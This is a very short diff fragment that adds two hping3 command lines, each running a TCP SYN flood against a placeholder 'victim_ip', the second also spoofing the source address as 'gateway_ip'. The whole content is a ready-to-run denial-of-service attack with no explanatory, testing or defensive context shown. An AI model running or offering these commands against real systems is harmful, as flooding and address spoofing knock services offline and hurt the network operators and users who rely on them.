@@ -1,0 +1,3 @@
+hping3 --flood -S victim_ip
+hping3 --flood -S --spoof gateway_ip victim_ip
+
